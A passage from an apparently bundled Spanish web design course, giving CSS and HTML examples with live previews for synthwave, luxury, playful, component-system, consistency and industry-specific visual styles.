  <div style="width:120px; height:120px; background:linear-gradient(#f0f, #0ff); border-radius:50%; box-shadow:0 0 30px #f0f;"></div>
  <div style="width:100%; height:2px; background:#f0f; margin-top:10px; opacity:0.3;"></div>
</div>
</details>

### Ejemplo 3: Tipografa Outline
Texto con contorno pero transparente por dentro.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  font-family:serif;
  font-size:4rem;
  font-weight:900;
  color:transparent;
  -webkit-text-stroke:1px #ff71ce;
  letter-spacing:10px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Outlined Text</summary>
<div class="preview-box">
<div style="font-family:serif; font-size:4rem; font-weight:900; color:transparent; -webkit-text-stroke:1px #ff71ce; letter-spacing:10px;">VIBE</div>
</div>
</details>

### Ejemplo 4: Piso de Rejilla 3D (Perspective)
El elemento visual ms icnico de la esttica sintetizada.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="width:200px; height:300px; background:url('https://images.unsplash.com/photo-1549439602-43ebca2327af?auto=format&fit=crop&w=300&q=80'); background-size:cover; filter:grayscale(1) contrast(1.1); box-shadow:0 30px 60px rgba(0,0,0,0.5); border:1px solid rgba(255,255,255,0.1);"></div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  background:#000;
  perspective: 100px;
  overflow:hidden;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: 3D Grid Floor</summary>
<div class="preview-box" style="background:#000; perspective: 100px; overflow:hidden;">
  <div style="width:200%; height:200%; background-image: linear-gradient(#f0f 1px, transparent 1px), linear-gradient(90deg, #f0f 1px, transparent 1px); background-size: 20px 20px; transform: rotateX(60deg); transform-origin: top; animation: scroll 2s linear infinite; opacity:0.5;"></div>
  <style>@keyframes scroll { from { background-position: 0 0; } to { background-position: 0 20px; } }</style>
</div>
</details>

### Ejemplo 5: Grainy Filter Overlay
Aadir ruido visual para que el diseo parezca una grabacin de VHS.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#222;
  position:relative;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: CRT Noise</summary>
<div class="preview-box" style="background:#222; position:relative;">
  <div style="position:absolute; inset:0; background:url('https://grainy-gradients.vercel.app/noise.svg'); opacity:0.1; mix-blend-mode:overlay; pointer-events:none;"></div>
  <div style="color:#0ff; font-family:serif; font-size:2rem; font-weight:bold; letter-spacing:5px;">PLAY >></div>
</div>
</details>

`,completed:!1},{id:"visual-arch-4-3-luxury",title:"4.3 Luxury / High-end",level:"junior",content:`# 4.3 Luxury / High-end

Menos es ms, materiales nobles y aire masivo.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Letter Spacing de Lujo
Dando importancia a cada letra.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#000;
  border-radius:12px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Luxury Typography</summary>
<div class="preview-box" style="background:#000; border-radius:12px;">
  <div style="color:#d4af37; font-family:serif; letter-spacing:1em; text-transform:uppercase; font-size:0.8rem; border-bottom:1px solid rgba(212,175,55,0.2); padding-bottom:1rem;">Prestige</div>
</div>
</details>

### Ejemplo 2: Gold Foil Border
Un borde metlico sutil.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#111;
  border-radius:12px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Gold Accent</summary>
<div class="preview-box" style="background:#111; border-radius:12px;">
  <div style="border:1px solid #d4af37; padding:2rem 4rem; color:#fff; font-family:serif; text-align:center;">
    <div style="font-size:1.5rem;">The Collection</div>
    <div style="font-size:0.6rem; opacity:0.5; margin-top:5px; letter-spacing:3px;">PARIS - MILAN - LONDON</div>
  </div>
</div>
</details>

### Ejemplo 3: Soft Fade Image
Imgenes que emergen de la oscuridad.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  width:200px;
  height:300px;
  background:url('https://images.unsplash.com/photo-1549439602-43ebca2327af?auto=format&fit=crop&w=300&q=80');
  background-size:cover;
  filter:grayscale(1) contrast(1.1);
  box-shadow:0 30px 60px rgba(0,0,0,0.5);
  border:1px solid rgba(255,255,255,0.1);
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Cinematic Image</summary>
<div class="preview-box">
<div style="width:200px; height:300px; background:url('https://images.unsplash.com/photo-1549439602-43ebca2327af?auto=format&fit=crop&w=300&q=80'); background-size:cover; filter:grayscale(1) contrast(1.1); box-shadow:0 30px 60px rgba(0,0,0,0.5); border:1px solid rgba(255,255,255,0.1);"></div>
</div>
</details>

### Ejemplo 4: Borde de Diamante (Minimal Accents)
Uso de formas geomtricas puras como separadores de lujo.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="width:100px; height:2px; background:linear-gradient(to right, transparent, #d4af37, transparent); position:relative; display:flex; justify-content:center; align-items:center;">
    <div style="width:10px; height:10px; background:#d4af37; transform:rotate(45deg);"></div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  width:100px;
  height:2px;
  background:linear-gradient(to right, transparent, #d4af37, transparent);
  position:relative;
  display:flex;
  justify-content:center;
  align-items:center;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Diamond Divide</summary>
<div class="preview-box">
<div style="width:100px; height:2px; background:linear-gradient(to right, transparent, #d4af37, transparent); position:relative; display:flex; justify-content:center; align-items:center;">
    <div style="width:10px; height:10px; background:#d4af37; transform:rotate(45deg);"></div>
  </div>
</div>
</details>

### Ejemplo 5: Transicin de Opacidad Suave
Elementos que no "saltan", sino que emergen con gracia.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="color:#fff; font-family:serif; text-align:center; transition: 1.5s; cursor:pointer;" onmouseover="this.style.opacity='1'; this.style.letterSpacing='10px'" onmouseout="this.style.opacity='0.3'; this.style.letterSpacing='2px'" style="opacity:0.3; letter-spacing:2px;">ESENCIA</div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  color:#fff;
  font-family:serif;
  text-align:center;
  transition: 1.5s;
  cursor:pointer;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Slow Reveal</summary>
<div class="preview-box">
<div style="color:#fff; font-family:serif; text-align:center; transition: 1.5s; cursor:pointer;" onmouseover="this.style.opacity='1'; this.style.letterSpacing='10px'" onmouseout="this.style.opacity='0.3'; this.style.letterSpacing='2px'" style="opacity:0.3; letter-spacing:2px;">ESENCIA</div>
</div>
</details>

`,completed:!1},{id:"visual-arch-4-4-playful",title:"4.4 Playful / Ilustrativo",level:"junior",content:`# 4.4 Playful / Ilustrativo

Amigable, redondo y lleno de vida.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Rounded Everything
Eliminando ngulos para un look infantil/amigable.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="background:#fff; border-radius:40px; padding:2rem; width:200px; text-align:center; font-family:sans-serif; box-shadow:0 10px 30px rgba(0,0,0,0.05);">
    <div style="font-size:3rem; margin-bottom:10px;"></div>
    <div style="font-weight:900; color:#ff6b6b;">Sweet!</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  background:#fff;
  border-radius:40px;
  padding:2rem;
  width:200px;
  text-align:center;
  font-family:sans-serif;
  box-shadow:0 10px 30px rgba(0,0,0,0.05);
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Rounded Card</summary>
<div class="preview-box">
<div style="background:#fff; border-radius:40px; padding:2rem; width:200px; text-align:center; font-family:sans-serif; box-shadow:0 10px 30px rgba(0,0,0,0.05);">
    <div style="font-size:3rem; margin-bottom:10px;"></div>
    <div style="font-weight:900; color:#ff6b6b;">Sweet!</div>
  </div>
</div>
</details>

### Ejemplo 2: Blob Shapes
Formas que fluyen.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="width:150px; height:150px; background:#4ecdc4; border-radius:30% 70% 70% 30% / 30% 38% 62% 70%; animation: morph 6s infinite ease-in-out;"></div>
  <style>@keyframes morph { 0%, 100% { border-radius: 30% 70% 70% 30% / 30% 38% 62% 70%; } 50% { border-radius: 50% 50% 20% 80% / 60% 40% 60% 40%; } }</style>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  width:150px;
  height:150px;
  background:#4ecdc4;
  border-radius:30% 70% 70% 30% / 30% 38% 62% 70%;
  animation: morph 6s infinite ease-in-out;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Organic Blob</summary>
<div class="preview-box">
<div style="width:150px; height:150px; background:#4ecdc4; border-radius:30% 70% 70% 30% / 30% 38% 62% 70%; animation: morph 6s infinite ease-in-out;"></div>
  <style>@keyframes morph { 0%, 100% { border-radius: 30% 70% 70% 30% / 30% 38% 62% 70%; } 50% { border-radius: 50% 50% 20% 80% / 60% 40% 60% 40%; } }</style>
</div>
</details>

### Ejemplo 3: Pastel Palette
Colores dulces y suaves.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:flex; gap:10px;">
    <div style="width:50px; height:50px; background:#ffadad; border-radius:15px;"></div>
    <div style="width:50px; height:50px; background:#ffd6a5; border-radius:15px;"></div>
    <div style="width:50px; height:50px; background:#fdffb6; border-radius:15px;"></div>
    <div style="width:50px; height:50px; background:#caffbf; border-radius:15px;"></div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  display:flex;
  gap:10px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Pastel Colors</summary>
<div class="preview-box">
<div style="display:flex; gap:10px;">
    <div style="width:50px; height:50px; background:#ffadad; border-radius:15px;"></div>
    <div style="width:50px; height:50px; background:#ffd6a5; border-radius:15px;"></div>
    <div style="width:50px; height:50px; background:#fdffb6; border-radius:15px;"></div>
    <div style="width:50px; height:50px; background:#caffbf; border-radius:15px;"></div>
  </div>
</div>
</details>

### Ejemplo 4: Botn "Squishy" (Interactive)
Un botn que se deforma al presionarlo, aumentando la satisfaccin tctil.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<button style="background:#ff6b6b; color:white; border:none; padding:15px 30px; border-radius:20px; font-weight:900; font-family:sans-serif; cursor:pointer; transition: 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);" onmousedown="this.style.transform='scale(0.8, 1.2)'" onmouseup="this.style.transform='scale(1)'">PRESS ME!</button>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  background:#ff6b6b;
  color:white;
  border:none;
  padding:15px 30px;
  border-radius:20px;
  font-weight:900;
  font-family:sans-serif;
  cursor:pointer;
  transition: 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Squishy Button</summary>
<div class="preview-box">
<button style="background:#ff6b6b; color:white; border:none; padding:15px 30px; border-radius:20px; font-weight:900; font-family:sans-serif; cursor:pointer; transition: 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275);" onmousedown="this.style.transform='scale(0.8, 1.2)'" onmouseup="this.style.transform='scale(1)'">PRESS ME!</button>
</div>
</details>

### Ejemplo 5: Fruta Flotante (Floating Shapes)
Elementos decorativos con animaciones alegres.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="font-size:4rem; animation: bounce 1s infinite alternate cubic-bezier(0.5, 0.05, 1, 0.5);"></div>
  <style>@keyframes bounce { from { transform: translateY(0) scale(1.1, 0.9); } to { transform: translateY(-40px) scale(0.9, 1.1); } }</style>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  font-size:4rem;
  animation: bounce 1s infinite alternate cubic-bezier(0.5, 0.05, 1, 0.5);
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Bouncing Shape</summary>
<div class="preview-box">
<div style="font-size:4rem; animation: bounce 1s infinite alternate cubic-bezier(0.5, 0.05, 1, 0.5);"></div>
  <style>@keyframes bounce { from { transform: translateY(0) scale(1.1, 0.9); } to { transform: translateY(-40px) scale(0.9, 1.1); } }</style>
</div>
</details>

`,completed:!1},{id:"visual-arch-5-2-componentizacion",title:"5.2 Componentizacin Visual",level:"senior",content:`# 5.2 Componentizacin Visual

Sistemas de componentes y variantes.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Button System
Variantes de botn (Primary, Secondary, Ghost).


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:flex; gap:10px; flex-wrap:wrap;">
    <button style="background:#10b981; border:none; padding:10px 20px; border-radius:8px; font-weight:bold; color:black;">PRIMARY</button>
    <button style="background:transparent; border:1px solid #10b981; padding:10px 20px; border-radius:8px; font-weight:bold; color:#10b981;">SECONDARY</button>
    <button style="background:transparent; border:none; padding:10px 20px; color:#666; font-weight:bold;">GHOST</button>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  display:flex;
  gap:10px;
  flex-wrap:wrap;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Component Variants</summary>
<div class="preview-box">
<div style="display:flex; gap:10px; flex-wrap:wrap;">
    <button style="background:#10b981; border:none; padding:10px 20px; border-radius:8px; font-weight:bold; color:black;">PRIMARY</button>
    <button style="background:transparent; border:1px solid #10b981; padding:10px 20px; border-radius:8px; font-weight:bold; color:#10b981;">SECONDARY</button>
    <button style="background:transparent; border:none; padding:10px 20px; color:#666; font-weight:bold;">GHOST</button>
  </div>
</div>
</details>

### Ejemplo 2: Input States
Feedback visual del componente (Normal, Focus, Error).


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:flex; align-items:center; gap:10px; background:rgba(255,255,255,0.05); padding:10px 20px; border-radius:50px; border:1px solid #333; color:#fff; font-family:sans-serif; font-size:0.9rem;">
    <span></span>
    <span>Performance Verified</span>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  flex-direction:column;
  gap:15px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Input States</summary>
<div class="preview-box" style="flex-direction:column; gap:15px;">
  <div style="background:#111; border:1px solid #333; padding:12px; border-radius:8px; width:220px; color:#666;">Normal State</div>
  <div style="background:#111; border:1px solid #10b981; padding:12px; border-radius:8px; width:220px; color:#fff; box-shadow:0 0 10px rgba(16,185,129,0.2);">Focus State</div>
  <div style="background:#111; border:1px solid #ef4444; padding:12px; border-radius:8px; width:220px; color:#ef4444;">Error State</div>
</div>
</details>

### Ejemplo 3: Icon + Text Alignment
Garantizando que las molculas se vean perfectas.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  display:flex;
  align-items:center;
  gap:10px;
  background:rgba(255,255,255,0.05);
  padding:10px 20px;
  border-radius:50px;
  border:1px solid #333;
  color:#fff;
  font-family:sans-serif;
  font-size:0.9rem;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Unified Iconography</summary>
<div class="preview-box">
<div style="display:flex; align-items:center; gap:10px; background:rgba(255,255,255,0.05); padding:10px 20px; border-radius:50px; border:1px solid #333; color:#fff; font-family:sans-serif; font-size:0.9rem;">
    <span></span>
    <span>Performance Verified</span>
  </div>
</div>
</details>

### Ejemplo 4: Banner de Alerta (Standardized)
Componente global para avisos importantes.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="width:100%; max-width:400px; background:#fffbeb; border-left:4px solid #f59e0b; padding:1rem; border-radius:4px; display:flex; gap:12px; align-items:flex-start;">
    <span style="color:#f59e0b;"></span>
    <div style="font-family:sans-serif;">
      <div style="font-size:0.8rem; font-weight:bold; color:#92400e;">Backup Required</div>
      <div style="font-size:0.7rem; color:#b45309; margin-top:2px;">Your data hasn't been synced in 24h.</div>
    </div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  width:100%;
  max-width:400px;
  background:#fffbeb;
  border-left:4px solid #f59e0b;
  padding:1rem;
  border-radius:4px;
  display:flex;
  gap:12px;
  align-items:flex-start;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Alert Banner</summary>
<div class="preview-box">
<div style="width:100%; max-width:400px; background:#fffbeb; border-left:4px solid #f59e0b; padding:1rem; border-radius:4px; display:flex; gap:12px; align-items:flex-start;">
    <span style="color:#f59e0b;"></span>
    <div style="font-family:sans-serif;">
      <div style="font-size:0.8rem; font-weight:bold; color:#92400e;">Backup Required</div>
      <div style="font-size:0.7rem; color:#b45309; margin-top:2px;">Your data hasn't been synced in 24h.</div>
    </div>
  </div>
</div>
</details>

### Ejemplo 5: Card Skeleton Loader
Estado visual durante la carga asncrona de datos.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="background:#111; border:1px solid #222; border-radius:12px; padding:1.5rem; width:200px;">
    <div style="width:40px; height:40px; background:#222; border-radius:8px; margin-bottom:1rem;"></div>
    <div style="width:80%; height:12px; background:#222; border-radius:4px; margin-bottom:0.5rem;"></div>
    <div style="width:50%; height:12px; background:#222; border-radius:4px;"></div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  background:#111;
  border:1px solid #222;
  border-radius:12px;
  padding:1.5rem;
  width:200px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Card Skeleton</summary>
<div class="preview-box">
<div style="background:#111; border:1px solid #222; border-radius:12px; padding:1.5rem; width:200px;">
    <div style="width:40px; height:40px; background:#222; border-radius:8px; margin-bottom:1rem;"></div>
    <div style="width:80%; height:12px; background:#222; border-radius:4px; margin-bottom:0.5rem;"></div>
    <div style="width:50%; height:12px; background:#222; border-radius:4px;"></div>
  </div>
</div>
</details>

`,completed:!1},{id:"visual-arch-5-3-consistencia",title:"5.3 Consistencia y Ritmo",level:"senior",content:`# 5.3 Consistencia y Ritmo

La clave de la confianza profesional.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Horizontal Alignment
Garantizando que los elementos fluyan en la misma lnea visual.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:1px; background:#333; width:300px;">
    <div style="background:#111; height:60px;"></div>
    <div style="background:#111; height:60px;"></div>
    <div style="background:#111; height:60px;"></div>
    <div style="background:#111; height:60px;"></div>
    <div style="background:#111; height:60px;"></div>
    <div style="background:#111; height:60px;"></div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  display:grid;
  grid-template-columns: repeat(3, 1fr);
  gap:1px;
  background:#333;
  width:300px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Grid Alignment</summary>
<div class="preview-box">
<div style="display:grid; grid-template-columns: repeat(3, 1fr); gap:1px; background:#333; width:300px;">
    <div style="background:#111; height:60px;"></div>
    <div style="background:#111; height:60px;"></div>
    <div style="background:#111; height:60px;"></div>
    <div style="background:#111; height:60px;"></div>
    <div style="background:#111; height:60px;"></div>
    <div style="background:#111; height:60px;"></div>
  </div>
</div>
</details>

### Ejemplo 2: Consistent Radius
Variables globales para bordes.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="display:flex; flex-direction:column; gap:10px; width:200px;">
    <div style="background:#10b981; color:black; padding:10px; border-radius:8px; font-weight:bold; text-align:center;">PRIMARY</div>
    <div style="background:rgba(16,185,129,0.2); color:#10b981; padding:10px; border-radius:8px; font-weight:bold; text-align:center;">SECONDARY</div>
    <div style="color:#666; padding:10px; border-radius:8px; font-weight:bold; text-align:center;">DENSE INFO</div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  flex-direction:column;
  gap:10px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Radius System</summary>
<div class="preview-box" style="flex-direction:column; gap:10px;">
  <div style="background:#fff; border-radius:12px; padding:20px; width:200px; color:#000; font-weight:bold; font-family:sans-serif; text-align:center; border:1px solid #ddd;">Main Card</div>
  <button style="background:#10b981; border:none; border-radius:12px; width:200px; padding:10px; font-weight:bold;">Same Radius Button</button>
</div>
</details>

### Ejemplo 3: Color Flow
Guiando el ojo a travs del color de acento.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  flex-direction:column;
  gap:20px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Visual Path</summary>
<div class="preview-box" style="flex-direction:column; gap:20px;">
  <div style="width:40px; height:40px; background:#10b981; border-radius:50%; display:flex; align-items:center; justify-content:center; color:black; font-weight:bold;">1</div>
  <div style="width:2px; height:40px; background:#10b981; opacity:0.3;"></div>
  <div style="width:40px; height:40px; background:#10b981; border-radius:50%; display:flex; align-items:center; justify-content:center; color:black; font-weight:bold;">2</div>
</div>
</details>

### Ejemplo 4: Gua de Ritmo Vertical (Baseline Grid)
Asegurar que cada prrafo y ttulo comparta un mltiplo comn de altura.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  position:relative;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Vertical Rhythm</summary>
<div class="preview-box" style="position:relative;">
  <div style="position:absolute; inset:0; background-image: repeating-linear-gradient(transparent, transparent 23px, rgba(16,185,129,0.1) 23px, rgba(16,185,129,0.1) 24px); pointer-events:none;"></div>
  <div style="position:relative; color:#fff; font-family:sans-serif; line-height:24px; font-size:16px;">
    Este texto est alineado a una rejilla base de 24px.<br/>
    La consistencia matemtica genera paz visual.<br/>
    Cada lnea encaja perfectamente.
  </div>
</div>
</details>

### Ejemplo 5: Jerarqua Lgica de Colores
Pasos predecibles desde la accin principal hasta la informacin secundaria.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  display:flex;
  flex-direction:column;
  gap:10px;
  width:200px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Color Hierarchy</summary>
<div class="preview-box">
<div style="display:flex; flex-direction:column; gap:10px; width:200px;">
    <div style="background:#10b981; color:black; padding:10px; border-radius:8px; font-weight:bold; text-align:center;">PRIMARY</div>
    <div style="background:rgba(16,185,129,0.2); color:#10b981; padding:10px; border-radius:8px; font-weight:bold; text-align:center;">SECONDARY</div>
    <div style="color:#666; padding:10px; border-radius:8px; font-weight:bold; text-align:center;">DENSE INFO</div>
  </div>
</div>
</details>

`,completed:!1},{id:"visual-arch-6-1-diseno-estrategico",title:"6.1 Diseo Estratgico por Nicho",level:"senior",content:`# 6.1 Diseo Estratgico por Nicho

El diseo como herramienta de negocio.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Esttica FinTech
Confianza y precisin tcnica.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="background:#fff; border-radius:16px; width:220px; overflow:hidden; box-shadow:0 10px 30px rgba(0,0,0,0.05);">
    <div style="background:#fdba74; height:150px; display:flex; align-items:center; justify-content:center; font-size:3rem;"></div>
    <div style="padding:1rem;">
      <div style="font-weight:bold; color:#111;">Classic Brogues</div>
      <div style="color:#ef4444; font-weight:900; margin:5px 0 10px 0;">$89.00</div>
      <button style="width:100%; background:#000; color:white; border:none; padding:10px; border-radius:8px; font-weight:bold;">ADD TO CART</button>
    </div>
  </div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  background:#f8fafc;
  border-radius:12px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: FinTech Style</summary>
<div class="preview-box" style="background:#f8fafc; border-radius:12px;">
  <div style="background:#fff; border:1px solid #cbd5e1; border-radius:8px; padding:1.5rem; width:260px; font-family:monospace; color:#1e293b;">
    <div style="font-size:0.7rem; color:#64748b; margin-bottom:0.5rem;">ACCOUNT BALANCE</div>
    <div style="font-size:1.5rem; font-weight:900;">$24,050.00 <span style="font-size:0.8rem; color:#10b981;">+2.4%</span></div>
  </div>
</div>
</details>

### Ejemplo 2: Esttica E-Commerce
Urgencia y llamada a la accin clara.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#fff;
  border-radius:16px;
  width:220px;
  overflow:hidden;
  box-shadow:0 10px 30px rgba(0,0,0,0.05);
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Shopping Style</summary>
<div class="preview-box">
<div style="background:#fff; border-radius:16px; width:220px; overflow:hidden; box-shadow:0 10px 30px rgba(0,0,0,0.05);">
    <div style="background:#fdba74; height:150px; display:flex; align-items:center; justify-content:center; font-size:3rem;"></div>
    <div style="padding:1rem;">
      <div style="font-weight:bold; color:#111;">Classic Brogues</div>
      <div style="color:#ef4444; font-weight:900; margin:5px 0 10px 0;">$89.00</div>
      <button style="width:100%; background:#000; color:white; border:none; padding:10px; border-radius:8px; font-weight:bold;">ADD TO CART</button>
    </div>
  </div>
</div>
</details>

### Ejemplo 3: Esttica Portfolio Creative
Rompimiento de reglas para destacar.


<details class="code-details">
<summary class="code-summary">Ver Cdigo (HTML + CSS)</summary>

### ESTRUCTURA (HTML)
\`\`\`html
<div style="font-size:4rem; cursor:pointer; transition:0.2s;" onmouseover="this.style.transform='scale(1.2)'" onmouseout="this.style.transform='scale(1)'" onclick="var s = this.style; s.transform='scale(1.5)'; setTimeout(function(){s.transform='scale(1.2)'}, 100)"></div>
\`\`\`

### ESTILOS (CSS)
\`\`\`css
.example-element {
  background:#000;
  border-radius:12px;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Creative Style</summary>
<div class="preview-box" style="background:#000; border-radius:12px;">
  <div style="color:#fff; font-family:serif; text-align:center;">
    <div style="font-size:0.6rem; letter-spacing:8px; opacity:0.4; margin-bottom:1rem;">DIGITAL ARTIST</div>
    <div style="font-size:3rem; font-weight:900; font-style:italic;">VISION</div>
  </div>
</div>
</details>

### Ejemplo 4: Esttica Health-Tech (Trust)
Colores claros, azules suaves y mucho espacio blanco para transmitir higiene y confianza.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#f0f9ff;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Health Style</summary>
<div class="preview-box" style="background:#f0f9ff;">
  <div style="background:#fff; padding:2rem; border-radius:12px; border-top:5px solid #0ea5e9; box-shadow:0 4px 6px rgba(0,0,0,0.05); width:240px; font-family:sans-serif;">
    <div style="color:#0369a1; font-weight:bold; font-size:0.8rem;">Patient Dashboard</div>
    <div style="font-size:1.5rem; font-weight:900; color:#0c4a6e; margin:10px 0;">Heart Rate</div>
    <div style="color:#0ea5e9; font-size:2rem; font-weight:900;">72 <span style="font-size:0.8rem; font-weight:normal;">BPM</span></div>
  </div>
</div>
</details>

### Ejemplo 5: Esttica Gaming (High Intensity)
Contrastes agresivos, neones y bordes afilados.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  background:#050505;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Gaming Style</summary>
<div class="preview-box" style="background:#050505;">
  <div style="border:1px solid #facc15; background:linear-gradient(135deg, #111, #000); padding:1.5rem; width:200px; skewX:(-10deg); position:relative;">
    <div style="background:#facc15; padding:4px 10px; color:black; font-weight:900; display:inline-block; margin-bottom:10px; font-family:sans-serif; font-style:italic;">RANK UP</div>
    <div style="color:white; font-family:sans-serif; font-weight:800; font-size:1.2rem; letter-spacing:-1px;">LEVEL 42 REACHED</div>
  </div>
</div>
</details>

`,completed:!1},{id:"visual-arch-6-2-ingenieria-emocion",title:"6.2 Ingeniera de la Emocin",level:"senior",content:`# 6.2 Ingeniera de la Emocin

Feedback que enamora al usuario.

---

##  Ejemplos Prcticos de Aplicacin

### Ejemplo 1: Heart Beat (Interaction)
Animaciones orgnicas que responden a la accin.


<details class="code-details">
<summary class="code-summary">Ver Cdigo</summary>

\`\`\`css
.example-element {
  font-size:4rem;
  cursor:pointer;
  transition:0.2s;
}
\`\`\`

</details>

<details class="preview-details">
<summary class="preview-summary">Ver Resultado: Feedback Pop</summary>
<div class="preview-box">
